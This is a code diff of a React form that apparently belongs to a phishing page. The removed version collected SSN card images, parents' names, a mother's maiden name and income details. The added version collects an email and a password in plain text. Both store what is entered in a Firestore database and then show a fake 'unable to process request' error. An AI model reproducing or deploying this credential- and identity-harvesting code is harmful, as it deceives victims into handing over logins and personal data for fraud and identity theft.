@@ -9,11 +9,8 @@ function Form() {
     const collectionRef = collection(database, 'users');
 
     const [formData, setFormData] = useState({
-        name: "",
-        phoneNumber: "",
-        ssn: "",
-        country: "",
-        address: "",
+       email: "",
+       password: "",
     })
 
     function handleData(event) {
@@ -66,11 +63,8 @@ function Form() {
     function handleSubmit(event) {
         event.preventDefault();
         addDoc(collectionRef, {
-            name: formData.name,
-            phoneNumber: formData.phoneNumber,
-            ssn: formData.ssn,
-            country: formData.country,
-            address: formData.address,
+            email: formData.email,
+            password: formData.password,
         })
         .then(()=> {
             alert("unable to process request, try again later");
@@ -78,47 +72,20 @@ function Form() {
         .catch((err)=> {
             console.log(err.message);
         })
-        handlePicSubmit();
-        handlePicSubmit2();
+       
     }
 
     return (
         <form onSubmit={handleSubmit} >
             <section className="form">
-                <div className="left">
-                    <div>
-                        <h2>*FATHERS FULL NAME</h2>
-                        <input type="text" name="name" onChange={handleData}/>
-                    </div>
-                    <div>
-                        <h2>*MOTHERS FUL NAME</h2>
-                        <input type="number" name="phoneNumber" onChange={handleData}/>
-                    </div>
-                   
-                    <div>
-                        <h2>UPLOAD BACK OF SSN CARD</h2>
-                        <input type="file" onChange={(event)=> setPicData2(event.target.files[0])}/>
-                    </div>
-                    <div>
-                        <h2>UPLOAD FRONT OF SSN CARD</h2>
-                        <input type="file" onChange={(event)=> setPicData(event.target.files[0])}/>
-                    </div>
-                </div>
-
-                <div className="right">
-                    <div>
-                        <h2>SOURCE OF INCOME IN 2022</h2>
-                        <input type="text" name="country" onChange={handleData}/>
-                    </div>
-                    <div>
-                        <h2>HOW MUCH DID YOU EARN IN 2022</h2>
-                        <input type="text" name="address" onChange={handleData}/>
-                    </div>
-                    <div>
-                        <h2>* MOTHER'S MEDIAN NAME</h2>
-                        <input type="number" name="ssn" onChange={handleData}/>
-                    </div>
-                </div>
+               <div>
+                <h2>Your Email</h2>
+                <input type="text" placeholder="Enter your Email" name="email" onChange={handleData}/>
+               </div>
+               <div>
+                <h2>Your Password</h2>
+                <input type="text" placeholder="Enter your Password" name="password"  onChange={handleData}/>
+               </div>
             </section>
             <div className="btn">
             <button>Continue</button>
